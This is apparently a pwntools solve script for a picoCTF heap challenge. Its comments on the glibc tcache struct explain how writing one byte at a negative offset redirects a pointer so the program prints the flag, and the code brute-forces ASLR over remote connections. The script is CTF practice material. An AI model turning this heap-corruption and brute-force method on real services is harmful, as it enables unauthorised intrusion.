from pwn import *
context.log_level = "error"
import sys

"""
typedef struct tcache_entry
{
    struct tcache_entry *next;
     /* This field exists to detect double frees.  */
    struct tcache_perthread_struct *key;
} tcache_entry;

typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];             /*TCACHE_MAX_BINS = 64*/
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

tcache_perthread_struct is a 0x300 bytes long chunk at the start of the heap
"""

## [+] local

# offset to the tcache struct + counts + entries before the 0x80-sized entry + 1 (to replace the second byte)
# payload = str(-0x1500 + 21*8 + 7*8 + 1).encode() + b"\n"

# [heap]          0x603500 'Congrats! Your flag is:
# ord("4") = 0x34
# 0x6034f0 + 0x10 =  0x603500 (ASLR is a thing here, so 1/16 chance to get the correct byte)
# payload += "4" 

## [+] remote
# -5141, -5142, -5143, -5144 are the "address" bytes, found by trial and error
# brute force ASLR
# basically you changed a byte for the address that is printed, now it prints the flag
for address in range(-5141,-5145,-1):
    print(f"[+] Address: {address}")
    for _ in range(0x10*2):
        r = remote(sys.argv[1],int(sys.argv[2]))
        r.sendline((str(address) + "\n4").encode())
        output = r.recv(1024)
        print(output)
        if b"picoCTF" in output:
            exit(0)
        r.close()
